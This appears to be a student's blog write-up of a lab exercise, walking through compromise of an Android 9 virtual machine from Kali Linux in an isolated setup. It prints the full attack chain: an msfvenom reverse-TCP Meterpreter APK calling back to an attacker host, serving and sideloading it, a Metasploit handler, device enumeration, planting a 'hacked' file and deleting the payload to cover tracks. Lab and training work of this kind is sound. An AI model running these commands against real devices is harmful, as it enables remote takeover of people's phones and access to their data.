---
title: "Mobile Hacking"
layout: post
---
Summary:
  1. Exploit the vulnerabilites in an Android device
  2. Device enumeration and covering tracks

To begin this exercise I launched and logged into the Administrator account of a Windows OS virtual machine.

Following log in, I launched the Microsoft hypervisor application called Hyper-V Manager.

Once Hyper-V launched, I focused my attention to the "Android Pie" virtual machine that appeared and selected connect.

This started an Android 9.0 OS virtual machine. I then viewed the Network & Internet settings which allowed me to find the IP address, Gateway, Subnet Mask, and DNS.

<img width="386" alt="image" src="https://github.com/Devin10Dahlberg/devin10dahlberg.github.io/assets/149525072/ee10fb85-104a-4da6-81af-c25676117df5">


To begin the next portion of the exercise, I launched and logged into the root account of Kali Linux virtual machine and launched a new terminal window.

Once the terminal window appeared, I entered the command:

  - systemctl start apache2

This command starts the Apache2 service and with replacing start with status you can confirm that it is running by locating the "Active" field.

Next, by default Apache servers will not allow access to the resources located at /var/www/html. Therefore, I will need to remove the file and create a directory that I can create a payload in to exploit the Android emulator.

I did this by entering the commands:

  - rm /var/www/html/index.html
  - mkdir /var/www/html/lab25

Following this, I began to create my own payload for the android device by entering the command:

  - msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=4444 R > /var/www/html/lab25/android.apk

![image](https://github.com/Devin10Dahlberg/devin10dahlberg.github.io/assets/149525072/a53c1baa-ec77-44c6-b776-ad21d45a55ce)



For the next portion of the exercise, I need to access and install the malicious Android APK file saved in the apache server.

From the Android VM, I launched a Google Chrome browser and entered the IP address of the Linux machine in the address bar.

At this point, I located the folder "lab25" and downloaded the "android.apk" file, and allowed Chrome to access photos, media, and files on the device.

After ignoring the warnings from Google Chrome, I opened the file to begin installing.

After the application is done installed, I clicked the open option that appeared from the App Installed Message.

Now that the application is successfully installed on the Android device, I switched back to the Kali Linux VM and in a terminal window entered the command:

  - sudo msfconsole

to launch metasploit.

Once inside metasploit, I entered the command:

  - use exploit/multi/handler

Followed by the command:

  - set payload android/meterpreter/reverse_tcp

I then set the LHOST with the command:

  - set LHOST 192.168.0.2

and began exploiting the device by running the command:

  - exploit -j -z

This command tells the exploit to run the job and do not interact with the session after the connection is made.

Once the session is created between the two devices, I entered the command:

  - session -i 1

Which means interact with the supplied session ID, in this scenario it is 1. This also launched the Meterpreter shell, which means I have successfully accessed and exploited the Android emulator.

To go further, I attempted to learn more information about the target such as the network interfaces, and system information.

To begin I entered the commands:

  - sysinfo / This revealed that the computer is localhost, the OS is Android 9 - Linux 4.19.110-android-x86_64, and Meterpreter is dalvik/android
  - ifconfig / This revealed the Interfaces. In Interface 1, I was able to determine the Name, Hardware MAC, IPv4 Address, IPv4 Netmask, IPv6 Address, and IPv6 Netmask.
  - app_list / This revealed a list of apps. I found that AnalyticsService, Android Easter Egg, Android Keyboard, Android Services Library, and Android Setup were all running, along with their package information.
  - check_root / The helped me identify that the device is rooted.

I then began to upload a file as proof that I accessed and exploited the device. I began by created a empty txt file, named it README.txt, and entered "YOU HAVE BEEN HACKED!!" in the file.

I then uploaded the file by entering the command:

  - upload -r /root/Desktop/README.txt /storage/emulated/0/Android/data

Then by switching back to the Android emulator and navigating to the internal storage. I was able to view the file and begin covering my tracks.

To cover my tracks, I switched back to the Kali Linux VM and removed the android.apk malicious file with the command:

  - rm android.apk


